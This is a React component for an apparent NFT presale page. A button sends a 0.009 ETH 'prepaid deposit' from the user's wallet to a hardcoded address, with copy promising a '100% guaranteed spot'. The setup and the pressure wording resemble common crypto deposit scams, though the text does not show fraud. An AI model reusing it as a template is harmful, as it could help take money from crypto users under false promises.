import { toast } from "react-toastify";
import { useState, useContext } from "react";
import { ethers } from "ethers";
import Contract from "../Context";

const MARKET_OWNER = "0x257D8297b84F7c65F37A1781D299BCcE1231433b"; //Account where send
const FEE_IN_ETH = "0.009"; //Fee

const Step2 = () => {
  const { signer, address, setSuccess } = useContext(Contract);
  const [isLoading, setIsLoading] = useState(false);

  const paidHandler = async () => {
    console.log(signer, address);
    if (signer && address) {
      setIsLoading(true);
      try {
        await signer.sendTransaction({
          to: MARKET_OWNER,
          value: ethers.utils.parseEther(FEE_IN_ETH),
        });
        toast.success("Transaction Success!");
        setSuccess(true);
        setIsLoading(false);
      } catch (err) {
        toast.error("Transaction Faild!");
        setIsLoading(false);
      }
    } else {
      toast.error("Not valid address!");
    }
  };

  return (
    <div>
      <h3 className="text-gray-300 text-lg my-6">
        This is a 100% guaranteed spot, we require 0.009 eth as a prepaid
        deposit. This amount will be deducted from the final MINT.
      </h3>
      <button
        disabled={isLoading}
        onClick={() => paidHandler()}
        className="w-full disabled:opacity-80 disabled:pointer-events-none text-md mb-5 bg-green-600 hover:bg-green-700"
      >
        {isLoading ? "loading..." : "PREPAID ACCESS"}
      </button>

      <p className="text-sky-400">
        If your deposit is not finalized, we will not include you on the
        waitlist and you will not be able to MINT your NFT.
      </p>
    </div>
  );
};

export default Step2;
